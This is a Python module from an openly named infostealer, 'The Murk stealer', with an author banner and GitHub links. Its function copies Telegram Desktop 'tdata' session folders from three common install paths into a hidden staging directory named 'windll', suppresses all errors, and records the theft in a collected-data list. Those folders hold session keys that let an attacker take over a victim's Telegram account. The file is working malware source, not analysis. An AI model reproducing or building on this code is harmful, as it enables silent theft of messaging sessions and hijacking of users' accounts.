#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from os import environ,sep
from shutil import copytree,ignore_patterns
"""
all needed paths
"""
path1 = 'D:\\Telegram Desktop\\tdata'
path2 = environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'


directory = r'C:\windll\Messengers\Telegram'

def Telegram(data):
    try:
        try:
            pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
            directory = rf'{pathtofile}\windll\Messengers\Telegram'
            copytree(path1,
                    directory,
                    ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
        except:
            pass
        try:
            copytree(path2,
                    directory,
                    ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
        except:
            pass
        try:
            copytree(path3,
                    directory,
                    ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
        except:
            pass
        data.append("\n∟📨Telegram")
        return data
    except:
        return data
